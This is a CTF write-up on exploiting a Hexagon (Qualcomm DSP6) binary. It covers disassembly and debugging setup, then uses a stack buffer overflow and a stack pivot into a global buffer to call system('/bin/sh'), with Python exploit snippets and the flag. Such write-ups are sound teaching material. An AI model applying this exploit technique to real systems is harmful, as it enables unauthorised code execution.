# m0lecon CTF 2023 Write-up: "🍼 Hexagon Toddler 🍼"
## Qualcomm DSP what?
The description of the challenge already hinted at a new architecture:
> Different architecture, same existential crisis 🤓
(P.S. LLDB and the provided Docker image are recommended for debugging)

The archive, among other things, contained a Dockerfile, the binary, and the source code (how kind!). Running `file` finally confirmed what I was dealing with here:
> chall: ELF 32-bit LSB executable, QUALCOMM DSP6, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-hexagon.so.1, not stripped

So, what exactly is this architecture?

## Qualcomm DSP6!
Qualcomm DSP6, also known as Hexagon, was introduced in 2006. It is a 32 bit Little Endian architecture, with a fixed size encoding of 4 Bytes. Hexagon is used in Snapdragon chips, which you might know from your average Android Smartphone, or cars, wearables etc.

But enough about the architecture, let's do what I did at first: Not reading the [manual](https://developer.qualcomm.com/qfile/67417/80-n2040-45_b_qualcomm_hexagon_v67_programmer_reference_manual.pdf), and just taking a look at the disassembly of main:
```
00020480 <main>:
   20480:	06 c0 9d a0	a09dc006 { 	allocframe(#0x30) } 
   20484:	80 ff fe bf	bffeff80 { 	r0 = add(r30,#-0x4) } 
   20488:	00 c0 40 3c	3c40c000 { 	memw(r0+#0x0) = #0x0 } 
   2048c:	06 48 00 00	00004806 { 	immext(#0x20180)
   20490:	00 d6 49 6a	6a49d600   	r0 = add(pc,##0x201ac) } 
   20494:	f6 e0 9e a7	a79ee0f6 { 	memw(r30+#-0x28) = r0 } 
   20498:	ff 7b ff 0f	0fff7bff { 	immext(#0xfffeffc0)
   2049c:	80 c6 80 91	9180c680   	r0 = memw(r0+##-0x1000c) } 
   204a0:	00 c0 80 91	9180c000 { 	r0 = memw(r0+#0x0) } 
   204a4:	42 c0 00 78	7800c042 { 	r2 = #0x2 } 
   204a8:	f5 e2 9e a7	a79ee2f5 { 	memw(r30+#-0x2c) = r2 } 
   204ac:	03 c0 00 78	7800c003 { 	r3 = #0x0 } 
   204b0:	f7 e3 9e a7	a79ee3f7 { 	memw(r30+#-0x24) = r3 } 
   204b4:	01 c0 63 70	7063c001 { 	r1 = r3 } 
   204b8:	64 c0 00 5a	5a00c064 { 	call 0x20580 } 
   [...]
   20538:	e0 fe 9e 97	979efee0 { 	r0 = memw(r30+#-0x24) } 
   2053c:	1e c0 1e 96	961ec01e { 	dealloc_return } 
```
Uhhm, yeah. I quickly decided that I actually should look at the manual. You can see directly that this is not your average assembly syntax. 
To get the most important things out of the way, Hexagon has a few interesting tricks up its sleeve:
- Parallelism: \
    Instruction packets are denoted in curly braces. These instructions are executed in parallel.
- Built-in Stack smashing and (sort-of) stack pivoting protection \
    There are two special registers: `framekey` and `frameliimit`. When creating a stack frame using `allocframe(size)`, the return address is put onto the stack, xored with the `framekey` register. `dealloc_return` then removes said stackframe, and jumps back to our return address, which is recovered by xoring with the `framekey` again.

    To protect against certain stack pivots, the `framelimit` register exists. TL;DR: If one allocates a stack frame when `sp < framelimit`, an exception is thrown.

    As I learned later on though, these protections are not important for this challenge.




## Buffer Overflow as a ~~Service~~*must*
Let's take a look at the source code:
```c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

char secret[1024] = {0};

void read_exact(char *s, size_t sz) {
    for (size_t i = 0; i < sz; i++)
        while (read(0, s +i, 1) != 1) ;
}

int main() {
    char buf[24];

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    puts("Tell me your deepest secret:");
    read_exact(secret, sizeof(secret));

    puts("Oke 🤓...");
    read_exact(buf, sizeof(buf) + 16);

    return 0;
}
```
I don't think I have to point out the vulnerability, as it is fairly obvious. Not only can you overflow a stack buffer, you actually *have* to do it, otherwise the program won't continue.

The binary was missing PIE and only had partial RELRO. Also, there were no stack canaries to be found.

## Setup struggles
### Objdump anyone?
But the time I saved on bughunting was well spent on trying to find out how to even disassemble this binary. I quickly found out that Qualcomm provides `objdump` at home through their [SDK](https://developer.qualcomm.com/software/hexagon-dsp-sdk/tools), but you have to register on their site to even be able to download it. Don't go this route, you will just get a deb-package containing a non-functional installer (Source: been there, done that).

While plugins for [Binary Ninja](https://github.com/google/binja-hexagon), [IDA Pro](https://github.com/gsmk/hexagon) and [Ghidra](https://github.com/toshipiazza/ghidra-plugin-hexagon) exist, they are all - as you can tell by the fact that they're plugins - inofficial, and I couldn't figure out how to build the Ghidra plugin, as it contained no installation instructions at all. A Disassembler written in [Python](https://github.com/programa-stic/hexag00n/blob/master/hexagondisasm/) was mentioned in some writeups, but it too did not work for me, as it kept spitting out errors when trying to import it.

But then there came an unexpected hero: LLVM! LLVM provides its own version of `objdump` with `llvm-objdump`, which can also handle DSP6.

Also, Cutter, a frontend for Radare2, also managed to disassemble the binary, which became especially useful when taking a look at the system's libc.

### ~~Rubber Duck~~ Debugging
After waiting an approximate three eternities for Fedora's package manager in the docker container to finish (I think `dnf` actually stands for "did not finish"), I wanted to test this binary. So I fired up the container, connected to port 1337 and.. nothing?

It seemed like netcat connected to `socaz` inside the container, but I didn't get any output. After some trying around with my port forwarding options, I ran the binary inside the container, only to be greeted by:
> permission denied: ./chall

*Sigh*. After a quick round of `chmod +x`, everything was running like it should.

Now onto how I debugged my exploit: Contrary to the belief of a teammate of mine (Sorry to call you out here..), `lldb` is *not* a MacOS-exclusive. As part of the llvm-project (starting to see a pattern here?), it can also be installed on linux. `gdb` cannot be used, as it does not support this architecture. So, I had to say goodbye to my beloved `i proc m` and `gef`, and had to learn how to use `lldb`.

By adding a `-g 42069` to the `qemu` options and not forgetting to expose that port to your host OS, `qemu` will spawn a gdb server and wait for a connection before it starts to run the binary. In lldb, running `gdb-remote 42069` was enough to establish a connection.

## Magic values
*Now* it was time to actually deal with the vulnerability at hand. Since I was too lazy to actually check the stack layout in detail, I quickly checked what I could overwrite by writing a magic value to each stack cell I could write to, and then checking the register values in lldb later:

```Python
for i in range (1, 11):
    send(p32(0x69420000 | i))
```

```
(lldb) c
Process 32 resuming
Process 32 stopped
* thread #1, stop reason = signal SIGSEGV
    frame #0: 0x6942000a
error: memory read failed for 0x69420000
(lldb) register read
Thread Registers:
       r00 = 0x00000000
[omitted for readability]
       r26 = 0x00000000
       r27 = 0x00000000
       r28 = 0x40910530
       r29 = 0x4080fdf0
       r30 = 0x69420009
       r31 = 0x6942000a
       sa0 = 0x4091a6e0
       lc0 = 0x00000001
       sa1 = 0x00000000
       lc1 = 0x00000000
      p3_0 = 0x0000ffff
        c5 = 0x00000000
        m0 = 0x00000000
        m1 = 0x00000000
       usr = 0x00056000
        pc = 0x6942000a
       ugp = 0x4093cea4
        gp = 0x00000000
       cs0 = 0x00000000
       cs1 = 0x00000000
  upcyclelo = 0x00000000
  upcyclehi = 0x00000000
  framelimit = 0x00000000
  framekey = 0x00000000
  pktcountlo = 0x00000000
  pktcounthi = 0x00000000
   pkt_cnt = 0x000634f4
  insn_cnt = 0x0006443c
   hvx_cnt = 0x00000000
       c23 = 0x00000000
       c24 = 0x00000000
       c25 = 0x00000000
       c26 = 0x00000000
       c27 = 0x00000000
       c28 = 0x00000000
       c29 = 0x00000000
  utimerlo = 0x00000000
  utimerhi = 0x00000000
```
Nice, so we can overwrite the `pc` (`r29`) and `fp` (`r30`) by simply interacting with our program. Also, you can see that the `framekey` register is set to zero, so we don't need to worry about a scrambled return address. Also, `framelimit` is also zeroed, which makes stack pivoting to lower addresses possible as well.

## My biggest secret: I like Stack pivots
Since my goal was to spawn a shell, I needed to at least control the instruction pointer and `r0`, which will contain the first and only argument. To set `r0`, I went for the last two instructions of `main`:
```
20538:	e0 fe 9e 97	979efee0 { 	r0 = memw(r30+#-0x24) } 
2053c:	1e c0 1e 96	961ec01e { 	dealloc_return } 
```
So by jumping back by one instruction, writing my wanted `r0`-value to the stack and setting `r30` correctly, I can load an arbitrary value into r0!

But this was sadly not enough to pwn the challenge, as setting the `fp` so that I can load a value into `r0` meant that the next return address would be loaded from `buf + 20`, out of reach for my overwrite. The solution was to set `fp` to an address inside our `secret`-buffer, leading to a stack pivot. This meant that I had to prepare the `secret` buffer beforehand:

```python
secret_buf_addr = 0x00040658
# Starting with a bit of offset from our buffer
stack_pivot_start = secret_buf_addr + 0x200 
# How much I'll have to write
secret_len = 1024
deepest_secret  = 0x200*b'0' 
deepest_secret += + p32(0)
# value for r0, location of /bin/sh
deepest_secret += p32(secret_buf_addr + 0x30) 
# Values that we don't care about
deepest_secret += 9*p32(0)
# Our return address
deepest_secret += p32(system_addr)
deepest_secret += b"/bin/sh\0"

send(deepest_secret + (secret_len - len(deepest_secret)) * b"A")
```

So our second buffer overflow looks like this:
```python
for i in range (1, 11):
    if i == 10: # instruction pointer
        send(p32(0x20538))
    elif i == 9: # lr, aka. r30
        send(p32(stack_pivot_start + 0x28))
    else:
        send(p32(0x69420000 | i))
```

But wait, how do we know the address of `system`? Well, `qemu` does not seem to randomize the library layout, so once you know where the libc is, you can hardcode that address. As I had to find out later though, the address mapping is not constant across devices. To verify that `chall` was still at the right address, I returned into the plt entry of puts, with the address `secret+0x230` as an argument. Since it was the same, I got the expected value, `"/bin/sh"`. To find out what the `system` address is on our target, I jumped to the plt entry of `puts`, with the got-address of `puts` as an argument. And there we had it: Simply adding `0x200000` to my hardcoded `system`-address did the trick!

Running the exploit against the remote server and running `cat flag.txt` in the shell gave me the flag for this challenge: `ptm{qu4lC0mm_94V3_m3_l3m0n5_50_1_m4d3_L3M0n4D3}`.

The challenge was solved by 8/10 teams during the CTF, and in the end was worth 129 points.
